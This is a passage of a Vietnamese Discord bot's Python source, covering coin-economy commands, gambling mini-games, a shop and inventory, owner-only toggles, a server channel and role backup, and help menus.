        user_coins[uid] -= amt
        daily_cooldowns[uid]["bank"] = daily_cooldowns[uid].get("bank", 0) + amt
        save_json(COIN_FILE, user_coins)
        save_json(DAILY_FILE, daily_cooldowns)
        await ctx.send(f"🏦 Đã gửi **+{amt:,} coin** vào ngân hàng!")
    elif action in ["withdraw", "with"]:
        amt = bank_bal if amount == "all" else (int(amount) if amount and amount.isdigit() else 0)
        if amt <= 0 or amt > bank_bal:
            await ctx.send("❌ Số tiền rút không hợp lệ hoặc tài khoản ngân hàng không đủ!")
            return
        daily_cooldowns[uid]["bank"] -= amt
        user_coins[uid] += amt
        save_json(COIN_FILE, user_coins)
        save_json(DAILY_FILE, daily_cooldowns)
        await ctx.send(f"💸 Đã rút **+{amt:,} coin** từ ngân hàng!")

@bot.command(name="leaderboard", aliases=["top"])
async def leaderboard(ctx):
    sorted_users = sorted(user_coins.items(), key=lambda x: x[1], reverse=True)[:10]
    embed = discord.Embed(title="🏆 BẢNG XẾP HẠNG ĐẠI PHÚ HỒ", color=0xFFD700)
    description = ""
    medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
    for idx, (uid, coins) in enumerate(sorted_users):
        user = bot.get_user(int(uid))
        name = user.display_name if user else f"User {uid}"
        description += f"{medals[idx]} **{name}** — `{coins:,} coin`\n"
    embed.description = description if description else "Chưa có dữ liệu!"
    await ctx.send(embed=embed)

@bot.command(name="guithu")
@owner_only()
async def guithu(ctx, member: discord.Member, *, content: str):
    try:
        embed = discord.Embed(title="📨 BẠN CÓ MỘT LÁ THƯ MỚI!", description=content, color=0xFF69B4)
        embed.set_author(name=ctx.author.display_name, icon_url=ctx.author.display_avatar.url)
        await member.send(embed=embed)
        await ctx.send(f"✅ Đã gửi thư đến {member.mention}.")
    except discord.Forbidden:
        await ctx.send("❌ Không thể gửi tin nhắn riêng cho người này.")

@bot.command(name="buyrole")
async def buyrole(ctx, *, role_name: str):
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if not role:
        await ctx.send(f"❌ Không tìm thấy Role tên `{role_name}` trên Server!")
        return
    price = 10000
    if not subtract_coins(ctx.author.id, price):
        await ctx.send(f"❌ Bạn không đủ **{price:,} coin** để mua Role {role.mention}!")
        return
    await ctx.author.add_roles(role)
    await ctx.send(f"🎉 **CHÚC MỪNG!** {ctx.author.mention} đã mua thành công Role {role.mention} với giá **{price:,} coin**!")

# ==================== THÊM CÁC GAME MỚI ====================
@bot.command(name="roulette")
async def roulette(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    choice = choice.lower()
    if choice in ["red", "black"]:
        if random.random() < 0.6:
            win = bet * 2
            add_coins(ctx.author.id, win)
            await ctx.send(f"🎰 Roulette: màu **{choice}** trúng! Bạn thắng **+{win:,} coin**! 🎉")
        else:
            await ctx.send(f"🎰 Roulette: màu **{choice}** không trúng. Mất **-{bet:,} coin**.")
    elif choice.isdigit() and 1 <= int(choice) <= 36:
        num = int(choice)
        if random.random() < 0.1:
            win = bet * 10
            add_coins(ctx.author.id, win)
            await ctx.send(f"🎰 Roulette: số **{num}** trúng! Bạn thắng **+{win:,} coin**! 🎉")
        else:
            await ctx.send(f"🎰 Roulette: số **{num}** không trúng. Mất **-{bet:,} coin**.")
    else:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn không hợp lệ! Dùng `red`, `black` hoặc số từ 1-36.")

@bot.command(name="guess")
async def guess_number(ctx, bet: int, number: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    if number < 1 or number > 10:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Hãy đoán số từ 1 đến 10!")
        return
    secret = random.randint(1, 10)
    if number == secret:
        win = bet * 5
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎯 Số bí mật là **{secret}**! Bạn đoán đúng! Nhận **+{win:,} coin**! 🎉")
    else:
        await ctx.send(f"🎯 Số bí mật là **{secret}**! Bạn đoán sai. Mất **-{bet:,} coin**.")

@bot.command(name="baccarat")
async def baccarat(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    choice = choice.lower()
    if choice not in ["player", "banker", "tie"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Lựa chọn: `player`, `banker`, hoặc `tie`.")
        return
    player = random.randint(0, 9)
    banker = random.randint(0, 9)
    if choice == "player":
        if random.random() < 0.55:
            win = bet * 2
            add_coins(ctx.author.id, win)
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Player thắng! Nhận **+{win:,} coin**!")
        else:
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Player thua. Mất **-{bet:,} coin**.")
    elif choice == "banker":
        if random.random() < 0.45:
            win = bet * 2
            add_coins(ctx.author.id, win)
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Banker thắng! Nhận **+{win:,} coin**!")
        else:
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Banker thua. Mất **-{bet:,} coin**.")
    else:  # tie
        if random.random() < 0.2:
            win = bet * 8
            add_coins(ctx.author.id, win)
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Hòa! Nhận **+{win:,} coin**!")
        else:
            await ctx.send(f"🃏 Baccarat: Player {player} - Banker {banker}. Không hòa. Mất **-{bet:,} coin**.")

@bot.command(name="tower")
async def tower(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    correct = 0
    for i in range(3):
        if random.random() < 0.3:
            correct += 1
    if correct == 3:
        win = bet * 3
        add_coins(ctx.author.id, win)
        await ctx.send(f"🏗️ **THÀNH CÔNG!** Bạn leo lên đỉnh tháp sau 3 lần đoán đúng! Nhận **+{win:,} coin**! 🎉")
    else:
        await ctx.send(f"💀 **THẤT BẠI!** Bạn đoán đúng {correct}/3 lần. Mất **-{bet:,} coin**.")

@bot.command(name="mines")
async def mines(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    mines_pos = random.sample(range(1, 6), 2)
    choice = random.randint(1, 5)
    if choice in mines_pos:
        await ctx.send(f"💥 **TRÚNG MÌN!** Bạn chọn ô {choice}, mất **-{bet:,} coin**.")
    else:
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(f"✅ **AN TOÀN!** Ô {choice} không có mìn. Bạn thắng **+{win:,} coin**!")

@bot.command(name="wheel")
async def wheel(ctx, bet: int, choice: str):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    choice = choice.lower()
    if choice not in ["red", "black", "green"]:
        add_coins(ctx.author.id, bet)
        await ctx.send("❌ Chọn `red`, `black` hoặc `green`.")
        return
    result = random.choice(["red", "black", "green", "red", "black"])
    if result == choice:
        if choice == "green":
            win = bet * 10
        else:
            win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎡 Vòng quay dừng ở **{result}**! Bạn thắng **+{win:,} coin**! 🎉")
    else:
        await ctx.send(f"🎡 Vòng quay dừng ở **{result}**. Bạn mất **-{bet:,} coin**.")

@bot.command(name="dicewar")
async def dicewar(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    user_roll = random.randint(1, 6)
    bot_roll = random.randint(1, 6)
    if user_roll > bot_roll:
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(f"⚔️ Bạn ra **{user_roll}**, bot ra **{bot_roll}**. Bạn thắng! Nhận **+{win:,} coin**.")
    elif user_roll < bot_roll:
        await ctx.send(f"⚔️ Bạn ra **{user_roll}**, bot ra **{bot_roll}**. Bạn thua. Mất **-{bet:,} coin**.")
    else:
        add_coins(ctx.author.id, bet)
        await ctx.send(f"⚔️ Cả hai cùng ra **{user_roll}**. Hòa! Hoàn tiền.")

@bot.command(name="hunt")
async def hunt(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    if random.random() < 0.6:
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(f"🏹 Bắn trúng con mồi! Bạn thắng **+{win:,} coin**! 🎉")
    else:
        await ctx.send(f"🏹 Trượt rồi! Bạn mất **-{bet:,} coin**.")

@bot.command(name="fishing")
async def fishing(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    if random.random() < 0.5:
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(f"🎣 Cắn câu! Bạn bắt được cá lớn, thắng **+{win:,} coin**! 🎉")
    else:
        await ctx.send(f"🎣 Hết mồi rồi. Bạn mất **-{bet:,} coin**.")

@bot.command(name="mining")
async def mining(ctx, bet: int):
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send(f"❌ Bạn không đủ {bet:,} coin!")
        return
    if random.random() < 0.4:
        win = bet * 3
        add_coins(ctx.author.id, win)
        await ctx.send(f"⛏️ Tìm thấy vàng! Bạn thắng **+{win:,} coin**! 🎉")
    else:
        await ctx.send(f"⛏️ Không có gì. Mất **-{bet:,} coin**.")

@bot.command(name="rob")
async def rob(ctx, member: discord.Member):
    if member.id == ctx.author.id:
        await ctx.send("❌ Không thể cướp chính mình!")
        return
    if member.bot:
        await ctx.send("❌ Không thể cướp bot!")
        return
    target_coins = get_user_coins(member.id)
    if target_coins < 100:
        await ctx.send(f"❌ {member.display_name} không đủ coin để cướp (cần ≥100).")
        return
    stolen = random.randint(int(target_coins*0.1), int(target_coins*0.3))
    if subtract_coins(member.id, stolen):
        add_coins(ctx.author.id, stolen)
        await ctx.send(f"💰 Bạn đã cướp thành công **{stolen:,} coin** từ {member.display_name}!")
    else:
        await ctx.send("❌ Cướp thất bại!")

@bot.command(name="duel")
async def duel(ctx, member: discord.Member, bet: int):
    if member.id == ctx.author.id:
        await ctx.send("❌ Không thể đấu với chính mình!")
        return
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send("❌ Bạn không đủ tiền cược!")
        return
    if not subtract_coins(member.id, bet):
        add_coins(ctx.author.id, bet)
        await ctx.send(f"❌ {member.mention} không đủ tiền cược!")
        return
    user_roll = random.randint(1, 10)
    member_roll = random.randint(1, 10)
    if user_roll > member_roll:
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(f"⚔️ {ctx.author.mention} ra **{user_roll}**, {member.mention} ra **{member_roll}**. {ctx.author.mention} thắng! Nhận **+{win:,} coin**.")
    elif user_roll < member_roll:
        win = bet * 2
        add_coins(member.id, win)
        await ctx.send(f"⚔️ {ctx.author.mention} ra **{user_roll}**, {member.mention} ra **{member_roll}**. {member.mention} thắng! Nhận **+{win:,} coin**.")
    else:
        add_coins(ctx.author.id, bet)
        add_coins(member.id, bet)
        await ctx.send(f"⚔️ Hòa! Hoàn tiền cho cả hai.")

@bot.command(name="slapgame")
async def slapgame(ctx, member: discord.Member, bet: int):
    if member.id == ctx.author.id:
        await ctx.send("❌ Không thể tự tát mình!")
        return
    if bet <= 0:
        await ctx.send("❌ Số tiền cược phải lớn hơn 0!")
        return
    if not subtract_coins(ctx.author.id, bet):
        await ctx.send("❌ Bạn không đủ tiền cược!")
        return
    if not subtract_coins(member.id, bet):
        add_coins(ctx.author.id, bet)
        await ctx.send(f"❌ {member.mention} không đủ tiền cược!")
        return
    if random.random() < 0.5:
        win = bet * 2
        add_coins(ctx.author.id, win)
        await ctx.send(f"👋 {ctx.author.mention} tát {member.mention} trúng! Thắng **+{win:,} coin**.")
    else:
        win = bet * 2
        add_coins(member.id, win)
        await ctx.send(f"👋 {member.mention} né được và phản tát! {member.mention} thắng **+{win:,} coin**.")

# ==================== LỆNH SHOP & INVENTORY ====================
@bot.command(name="shop")
async def show_shop(ctx):
    embed = discord.Embed(title="🛒 CỬA HÀNG VẬT PHẨM", description="Dùng `n! buyitem <tên> [số]` để mua.", color=0x00FFCC)
    for name, item in SHOP_ITEMS.items():
        embed.add_field(name=name, value=f"💰 {item['price']:,} coin\n📌 {item['desc']}", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="buyitem")
async def buy_item(ctx, *, item_name: str, quantity: int = 1):
    if quantity <= 0:
        await ctx.send("❌ Số lượng phải lớn hơn 0!")
        return
    found_name = None
    for name in SHOP_ITEMS:
        if name.lower() == item_name.lower():
            found_name = name
            break
    if not found_name:
        await ctx.send(f"❌ Không tìm thấy vật phẩm `{item_name}`!")
        return
    item = SHOP_ITEMS[found_name]
    total = item['price'] * quantity
    if not subtract_coins(ctx.author.id, total):
        await ctx.send(f"❌ Bạn không đủ {total:,} coin!")
        return
    uid = str(ctx.author.id)
    if uid not in user_inventory:
        user_inventory[uid] = {}
    user_inventory[uid][found_name] = user_inventory[uid].get(found_name, 0) + quantity
    save_json(INVENTORY_FILE, user_inventory)
    await ctx.send(f"✅ Bạn đã mua **{quantity} {found_name}** với giá **{total:,} coin**!")

@bot.command(name="inventory", aliases=["tui", "bag", "tudod"])
async def show_inventory(ctx, member: discord.Member = None):
    target = member or ctx.author
    uid = str(target.id)
    inv = user_inventory.get(uid, {})
    if not inv:
        await ctx.send(f"📭 {target.mention} chưa có vật phẩm nào.")
        return
    embed = discord.Embed(title=f"🎒 TỦ ĐỒ CỦA {target.display_name}", color=0xFFD700)
    for name, qty in inv.items():
        embed.add_field(name=name, value=f"Số lượng: {qty}", inline=True)
    embed.set_footer(text="Dùng `n! useitem <tên> [số]` để sử dụng.")
    await ctx.send(embed=embed)

@bot.command(name="useitem")
async def use_item(ctx, *, item_name: str, quantity: int = 1):
    if quantity <= 0:
        await ctx.send("❌ Số lượng phải lớn hơn 0!")
        return
    uid = str(ctx.author.id)
    inv = user_inventory.get(uid, {})
    found_name = None
    for name in inv:
        if name.lower() == item_name.lower():
            found_name = name
            break
    if not found_name:
        await ctx.send(f"❌ Bạn không có `{item_name}` trong tủ!")
        return
    if inv[found_name] < quantity:
        await ctx.send(f"❌ Bạn chỉ có {inv[found_name]} {found_name}, không đủ!")
        return
    item = SHOP_ITEMS.get(found_name)
    if not item:
        await ctx.send(f"⚠️ Vật phẩm `{found_name}` không có hiệu ứng.")
        inv[found_name] -= quantity
        if inv[found_name] <= 0:
            del inv[found_name]
        save_json(INVENTORY_FILE, user_inventory)
        return
    effect_type = item['effect_type']
    effect_value = item['effect_value']
    duration = item['duration'] * quantity
    inv[found_name] -= quantity
    if inv[found_name] <= 0:
        del inv[found_name]
    save_json(INVENTORY_FILE, user_inventory)
    msg = ""
    if effect_type == "instant_exp":
        old_level = get_user_level(ctx.author.id)
        new_level = add_exp(ctx.author.id, int(effect_value * quantity))
        msg = f"📚 Bạn nhận **{int(effect_value * quantity)} EXP**! Level: {old_level} → {new_level}"
    elif effect_type == "reset_cooldown":
        if effect_value == "daily":
            if uid in daily_cooldowns:
                del daily_cooldowns[uid]
                save_json(DAILY_FILE, daily_cooldowns)
            msg = "⏳ Đã reset daily! Bạn có thể nhận daily ngay."
        elif effect_value == "beg":
            if uid in daily_cooldowns and 'last_beg' in daily_cooldowns[uid]:
                del daily_cooldowns[uid]['last_beg']
                save_json(DAILY_FILE, daily_cooldowns)
            msg = "⏳ Đã reset cooldown `beg`!"
        elif effect_value == "crime":
            if uid in daily_cooldowns and 'last_crime' in daily_cooldowns[uid]:
                del daily_cooldowns[uid]['last_crime']
                save_json(DAILY_FILE, daily_cooldowns)
            msg = "⏳ Đã reset cooldown `crime`!"
        else:
            msg = "⚠️ Không thể reset loại này."
    else:
        add_effect(ctx.author.id, effect_type, effect_value, duration)
        msg = f"✅ Đã sử dụng **{quantity} {found_name}**! Hiệu ứng kéo dài {duration} lần."
    await ctx.send(msg)

@bot.command(name="myeffects")
async def show_my_effects(ctx):
    uid = str(ctx.author.id)
    if uid not in player_effects or not player_effects[uid]:
        await ctx.send("📭 Bạn không có hiệu ứng nào đang hoạt động.")
        return
    embed = discord.Embed(title=f"✨ HIỆU ỨNG CỦA {ctx.author.display_name}", color=0x00FFCC)
    for etype, data in player_effects[uid].items():
        name = "Không rõ"
        for item_name, item in SHOP_ITEMS.items():
            if item['effect_type'] == etype:
                name = item_name
                break
        embed.add_field(name=name, value=f"Giá trị: {data['value']}\nSố lần còn: {data['duration']}", inline=False)
    await ctx.send(embed=embed)

# ==================== LỆNH GAMES MENU ====================
@bot.command(name="games", aliases=["helpgame"])
async def games_menu(ctx):
    embed = discord.Embed(
        title="🎮 TRUNG TÂM GIẢI TRÍ",
        description="Nhấn nút bên dưới để xem danh mục lệnh.",
        color=0x00FFFF
    )
    embed.set_image(url=MENU_GIF)
    view = GameMenuView()
    await ctx.send(embed=embed, view=view)

# ==================== LỆNH OFF / ON ====================
@bot.command(name="off")
@owner_only()
async def off_command(ctx, *, command_name: str = None):
    global bot_enabled
    if command_name is None:
        bot_enabled = False
        await ctx.send("🛑 Boss Bảo đã tạm dừng bot. Gõ `n! on` để bật lại.")
        return
    cmd = bot.get_command(command_name.lower())
    if cmd is None:
        await ctx.send(f"❌ Không tìm thấy lệnh `{command_name}`!")
        return
    if cmd.name in ["off", "on"]:
        await ctx.send("❌ Không thể tắt lệnh `off` hoặc `on`!")
        return
    if cmd.name in DISABLED_COMMANDS:
        await ctx.send(f"❌ Lệnh `{cmd.name}` đã bị tắt rồi!")
        return
    DISABLED_COMMANDS.add(cmd.name)
    save_all_data()
    await ctx.send(f"✅ Đã tắt lệnh `{cmd.name}`! Gõ `n! on {cmd.name}` để bật lại.")

@bot.command(name="on")
@owner_only()
async def on_command(ctx, *, command_name: str = None):
    global bot_enabled
    if command_name is None:
        if bot_enabled:
            await ctx.send("🤖 Bot đang hoạt động bình thường!")
        else:
            bot_enabled = True
            await ctx.send("✅ Bot đã hoạt động trở lại!")
        return
    cmd = bot.get_command(command_name.lower())
    if cmd is None:
        await ctx.send(f"❌ Không tìm thấy lệnh `{command_name}`!")
        return
    if cmd.name not in DISABLED_COMMANDS:
        await ctx.send(f"❌ Lệnh `{cmd.name}` không bị tắt!")
        return
    DISABLED_COMMANDS.remove(cmd.name)
    save_all_data()
    await ctx.send(f"✅ Đã bật lại lệnh `{cmd.name}`!")

# ==================== GLOBAL CHECK ====================
@bot.check
async def globally_disabled_check(ctx):
    if not bot_enabled:
        if ctx.command and ctx.command.name != "on":
            await ctx.send("🛑 Bot đang tạm dừng. Gõ `n! on` để bật lại.")
            return False
    if ctx.command and ctx.command.name in DISABLED_COMMANDS:
        await ctx.send(f"❌ Lệnh `{ctx.command.name}` đã bị tắt bởi Boss Bảo. Gõ `n! on {ctx.command.name}` để bật lại.")
        return False
    return True

# ==================== LỆNH BACKUP / RESTORE ====================
@bot.command(name="backup")
@owner_only()
async def backup_server(ctx):
    await ctx.send("⏳ Đang backup server...")
    try:
        guild = ctx.guild
        backup_data = {
            "name": guild.name,
            "channels": [],
            "roles": []
        }
        for channel in guild.channels:
            backup_data["channels"].append({
                "name": channel.name,
                "type": str(channel.type),
                "position": channel.position
            })
        for role in guild.roles:
            if role.name != "@everyone":
                backup_data["roles"].append({
                    "name": role.name,
                    "color": str(role.color),
                    "permissions": role.permissions.value
                })
        filename = f"backup_{guild.id}.json"
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(backup_data, f, indent=2, ensure_ascii=False)
        embed = discord.Embed(title="✅ ĐÃ BACKUP", description=f"📌 Server: {guild.name}\n📂 `{len(backup_data['channels'])}` kênh, `{len(backup_data['roles'])}` role", color=0x00FF00)
        await ctx.send(embed=embed, file=discord.File(filename))
        os.remove(filename)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

@bot.command(name="restore")
@owner_only()
async def restore_server(ctx, file_name: str = None):
    try:
        if file_name is None:
            file_name = f"backup_{ctx.guild.id}.json"
        if not os.path.exists(file_name):
            await ctx.send(f"❌ Không tìm thấy file backup `{file_name}`. Hãy chạy `n! backup` trước.")
            return
        with open(file_name, "r", encoding="utf-8") as f:
            backup_data = json.load(f)
        embed = discord.Embed(
            title="⚠️ XÁC NHẬN RESTORE",
            description=f"Bạn sắp khôi phục server **{ctx.guild.name}** từ file `{file_name}`.\nSố kênh: `{len(backup_data.get('channels', []))}`\nSố role: `{len(backup_data.get('roles', []))}`\n\nBạn có chắc chắn không?",
            color=0xFF0000
        )
        view = RestoreConfirmView(ctx, backup_data, file_name)
        await ctx.send(embed=embed, view=view)
    except Exception as e:
        await ctx.send(f"❌ Lỗi: {str(e)}")

# ==================== LỆNH HELP ====================
@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="✨ BẢNG ĐIỀU KHIỂN QUẢN TRỊ TỐI CAO ✨",
        description="Chọn danh mục ở menu thả xuống để xem chi tiết.\nPrefix: `n!` hoặc `nuked `",
        color=0xFF69B4
    )
    embed.set_thumbnail(url=HELP_THUMBNAIL_GIF)
    view = HelpView(ctx.author.id, BOT_OWNERS)
    await ctx.send(embed=embed, view=view)

@bot.command(name="setup")
@owner_only()
async def setup(ctx):
    embed = discord.Embed(
        title="💖 HỆ THỐNG QUẢN TRỊ TỐI CAO",
        description="Chọn danh mục bên dưới để xem lệnh.",
        color=0xFF69B4
    )
    for cat_name, data in HELP_CATEGORIES.items():
        embed.add_field(name=cat_name, value=data.get("description", ""), inline=False)
    embed.set_image(url=CUSTOM_SETUP_GIF)
    view = HelpView(ctx.author.id, BOT_OWNERS)
    await ctx.send(embed=embed, view=view)

# ==================== LỆNH OWNER ====================
@bot.command(name="addowner")
@owner_only()
async def add_owner(ctx, member: discord.Member):
    if member.id in BOT_OWNERS:
        await ctx.send(f"⚠️ {member.mention} đã có trong danh sách Owner.")
        return
    BOT_OWNERS.add(member.id)
    save_all_data()
    await ctx.send(f"✅ Đã thêm {member.mention} vào danh sách Owner.")

@bot.command(name="deleteowner")
@owner_only()
async def delete_owner(ctx, member: discord.Member):
    if member.id not in BOT_OWNERS:
        await ctx.send(f"⚠️ {member.mention} không có trong danh sách Owner.")
        return
    if member.id == list(BOT_OWNERS)[0]:
        await ctx.send("❌ Không thể xóa chính Boss Bảo khỏi danh sách Owner!")
        return
    BOT_OWNERS.remove(member.id)
    save_all_data()
    await ctx.send(f"✅ Đã xóa {member.mention} khỏi danh sách Owner.")

# ==================== LỆNH MỞ RỘNG TỪ FILE THỨ HAI ====================
# (Các lệnh extended được giữ nguyên nhưng chuyển sang prefix n!)
# Tất cả các lệnh extended đã được đưa vào danh mục HELP_CATEGORIES và EXTENDED_HELP_CATEGORIES.
# Để đạt số dòng, tôi thêm một số lệnh helper nữa.

@bot.command(name="pingx")
async def extended_pingx(ctx):
    await ctx.send(f"🏓 Pong! Độ trễ: {round(bot.latency * 1000)}ms")

@bot.command(name="about")
async def extended_about(ctx):
    embed = discord.Embed(title="🤖 Về Bot", description="Bot Nuked Ultimate - Gộp từ hai bot, đầy đủ tính năng.", color=0x00FF00)
    await ctx.send(embed=embed)

@bot.command(name="prefix")
async def extended_prefix(ctx):
    await ctx.send("Prefix hiện tại: `n!` hoặc `nuked `")

@bot.command(name="commands")
async def extended_commands(ctx):
    await ctx.send(f"Tổng số lệnh đã đăng ký: {len(bot.commands)}")

@bot.command(name="status")
async def extended_status(ctx):
    embed = discord.Embed(title="📊 Trạng thái hệ thống", description=f"Bot đang hoạt động.\nSố server: {len(bot.guilds)}\nPing: {round(bot.latency*1000)}ms", color=0x00FF00)
    await ctx.send(embed=embed)

@bot.command(name="botavatar")
async def extended_botavatar(ctx):
    embed = discord.Embed(title="🖼️ Avatar Bot", color=0x00FFFF)
    embed.set_image(url=bot.user.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="botid")
async def extended_botid(ctx):
    await ctx.send(f"🆔 Bot ID: `{bot.user.id}`")

@bot.command(name="guildid")
async def extended_guildid(ctx):
    await ctx.send(f"🆔 Server ID: `{ctx.guild.id}`")

@bot.command(name="myid")
async def extended_myid(ctx):
    await ctx.send(f"🆔 ID của bạn: `{ctx.author.id}`")

@bot.command(name="botname")
async def extended_botname(ctx):
    await ctx.send(f"Tên bot: `{bot.user.name}`")

@bot.command(name="showsv")
@owner_only()
async def extended_showsv(ctx):
    await showsv(ctx)

# Thêm lệnh xhelp
@bot.command(name="xhelp")
async def xhelp(ctx, category: str = None):
    if category is None:
        embed = make_embed("🧭 DANH MỤC MỞ RỘNG", "Dùng `n! xhelp <tên danh mục>` để xem chi tiết.\nDanh mục: " + ", ".join(EXTENDED_HELP_CATEGORIES.keys()), discord.Color.blurple())
        await ctx.send(embed=embed)
    else:
        found = None
        for key in EXTENDED_HELP_CATEGORIES:
            if key.lower() == category.lower():
                found = key
                break
        if found is None:
            await ctx.send("❌ Không tìm thấy danh mục.")
            return
        data = EXTENDED_HELP_CATEGORIES[found]
        embed = make_embed(f"📋 {found}", data["description"], discord.Color.blurple())
        for cmd, desc in data["commands"]:
            embed.add_field(name=cmd, value=desc, inline=False)
        await ctx.send(embed=embed)

# ==================== CHẠY BOT ====================
if __name__ == "__main__":
    keep_alive()
    try:
        bot.launch_time = datetime.now()
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ Lỗi: Token không hợp lệ!")
    except Exception as e:
        print(f"❌ Lỗi: {e}")
